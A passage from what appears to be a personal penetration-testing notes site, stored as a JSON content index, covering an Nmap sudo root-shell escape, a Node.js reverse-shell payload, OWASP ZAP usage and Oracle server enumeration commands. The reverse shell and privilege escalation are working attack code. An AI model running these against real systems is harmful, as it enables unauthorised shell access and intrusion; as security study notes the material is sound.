$IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Normally &lt;code&gt;$PORT&lt;/code&gt; is 111.&lt;/p&gt;\n&lt;h2 id=&quot;shell-escape&quot;&gt;Shell escape&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#shell-escape&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;If Nmap can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then you can break out into a root shell by creating a file containing &lt;code&gt;os.execute(&quot;/bin/sh&quot;)&lt;/code&gt; and then running &lt;code&gt;nmap --script=$FILE&lt;/code&gt;.&lt;/p&gt;"},"spells/Node.js":{"slug":"spells/Node.js","filePath":"spells/Node.js.md","title":"Node.js","links":[],"tags":["Application/NodeJS","AttackCycle/Exploitation"],"content":"The hard part of popping a reverse shell on a Node.js server is tricking the server to load your code. If you can figure out how to do that, this seems to produce a reliable connection:\n(function(){\n\tvar net = require(&quot;net&quot;),\n\t    cp  = require(&quot;child_process&quot;),\n\t    sh = cp.spawn(&quot;/bin/sh&quot;, []);\n\tvar client = new net.Socket();\n\tclient.connect(1234, &quot;127.0.0.1&quot;, function(){\n\t\t// Customize port and IP address above to taste\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});\n\treturn /a/; // Prevents Node.js from crashing\n})();","richContent":"&lt;p&gt;The hard part of popping a reverse shell on a Node.js server is tricking the server to load your code. If you can figure out how to do that, &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;this&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; seems to produce a reliable connection:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;javascript&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(){&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tvar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; net&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; require&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;net&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;),&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t    cp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;  =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; require&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;child_process&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;),&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t    sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; cp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;spawn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; []);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tvar&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; new&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; net&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Socket&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\tclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;connect&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1234&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;127.0.0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; function&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(){&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t\t// Customize port and IP address above to taste&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\tclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;pipe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;sh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stdin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\tsh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stdout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;pipe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\tsh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;stderr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;pipe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t});&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\treturn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; // Prevents Node.js from crashing&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;})();&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/OSI-model":{"slug":"spells/OSI-model","filePath":"spells/OSI model.md","title":"OSI model","links":[],"tags":["Standard/OSI"],"content":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLayerRole7Application (highest)6Presentation5Session4Transport3Network2Data link1Physical (lowest)","richContent":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;center&quot;&gt;Layer&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;Role&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;7&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Application (highest)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;6&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Presentation&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;5&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Session&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;4&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Transport&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;3&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Network&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;2&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Data link&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;1&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Physical (lowest)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;"},"spells/OWASP-ZAP":{"slug":"spells/OWASP-ZAP","filePath":"spells/OWASP ZAP.md","title":"OWASP ZAP","links":["spells/Burp-Suite","spells/OWASP-ZAP","spells/gobuster"],"tags":["Application/OWASPZAP","Application/BurpSuite","AttackCycle/Reconnaissance/Fuzzing","AttackCycle/Reconnaissance/BruteForcing","OS/Linux/Distros/Kali"],"content":"ZAP (the “Zed Attack Proxy”) is basically an open-source version of Burp Suite.\nBurp Suite ↔ OWASP ZAP equivalencies:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBurp SuiteOWASP ZAPSite MapSite TreeHTTP HistoryHistoryScopeContextInterceptorBreakRepeaterRequest EditorIntruderFuzzerSpiderSpiderScannerActive ScanBApp StoreAdd On Marketplace\nWhile ZAP has a very different interface than Burp Suite, you should basically approach using it in the same fashion.\nThe ZAP browser\nAt least on Kali Linux, ZAP can launch a pre-configured Firefox session using web automation; thus, like Burp Suite, there’s really no need to configure a local proxy (and probably every reason not to — keep your profiles separate!).\nOne advantage of the ZAP browser is that it automatically passes session cookies back to ZAP!\nOne reason not to use ZAP’s browser, however, is that the user-agent is less generic than Burp Suite’s.\nAutomated scans\nAutomated scans can be fired off using the “Automated Scan” button on the ZAP Quick Start tab.\nThe “traditional spider” option spiders the website as you would expect, while the “AJAX spider” uses a headless browser to spider AJAX content.\nPath enumeration\nZAP has gobuster-like functionality called “Forced Browse”. The wordlist can be configured in Tools → Options → Forced Browse; enumeration can be started by right-clicking on the target site and choosing Site → Force Browse Site.","richContent":"&lt;p&gt;ZAP (the “Zed Attack Proxy”) is basically an open-source version of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt; ↔ &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/OWASP-ZAP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/OWASP-ZAP&quot;&gt;OWASP ZAP&lt;/a&gt; equivalencies:&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;OWASP ZAP&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Site Map&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Site Tree&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;HTTP History&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;History&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Scope&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Context&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Interceptor&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Break&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Repeater&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Request Editor&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Intruder&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Fuzzer&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Spider&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Spider&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;Scanner&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Active Scan&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;BApp Store&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Add On Marketplace&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;p&gt;While ZAP has a very different interface than &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;, you should basically approach using it in the same fashion.&lt;/p&gt;\n&lt;h2 id=&quot;the-zap-browser&quot;&gt;The ZAP browser&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#the-zap-browser&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;At least on Kali Linux, ZAP can launch a pre-configured Firefox session using web automation; thus, like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;, there’s really no need to configure a local proxy (and probably every reason not to — keep your profiles separate!).&lt;/p&gt;\n&lt;p&gt;One advantage of the ZAP browser is that it automatically passes session cookies back to ZAP!&lt;/p&gt;\n&lt;p&gt;One reason &lt;em&gt;not&lt;/em&gt; to use ZAP’s browser, however, is that the user-agent is less generic than &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;’s.&lt;/p&gt;\n&lt;h2 id=&quot;automated-scans&quot;&gt;Automated scans&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#automated-scans&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Automated scans can be fired off using the “Automated Scan” button on the ZAP Quick Start tab.&lt;/p&gt;\n&lt;p&gt;The “traditional spider” option spiders the website as you would expect, while the “AJAX spider” uses a headless browser to spider AJAX content.&lt;/p&gt;\n&lt;h2 id=&quot;path-enumeration&quot;&gt;Path enumeration&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#path-enumeration&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;ZAP has &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;-like functionality called “Forced Browse”. The wordlist can be configured in &lt;strong&gt;Tools → Options → Forced Browse&lt;/strong&gt;; enumeration can be started by right-clicking on the target site and choosing &lt;strong&gt;Site → Force Browse Site&lt;/strong&gt;.&lt;/p&gt;"},"spells/Oracle-SQL-Server":{"slug":"spells/Oracle-SQL-Server","filePath":"spells/Oracle SQL Server.md","title":"Oracle SQL Server","links":[],"tags":["Application/Oracle","Application/tnscmd10g","Application/oscanner","Application/sidguess","AttackCycle/Reconnaissance"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_Oracle.txt\n\n\n\n# Ping an Oracle server, get version information, etc.\n#\ntnscmd10g $COMMAND -h $IP_ADDRESS\n \n# Enumerate information about an Oracle server\n#\noscanner -s $IP_ADDRESS -P $PORT\n \n# Dictionary enumeration of Oracle server SIDs\n#\nsidguess -i $IP_ADDRESS -d $WORDLIST_FILE\nMore information about the above tools:\n\ntnscmd10g\noscanner\nsidguesser\n","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_Oracle.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_Oracle.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Ping an Oracle server, get version information, etc.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tnscmd10g&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $COMMAND&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -h&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Enumerate information about an Oracle server&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;oscanner&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Dictionary enumeration of Oracle server SIDs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span 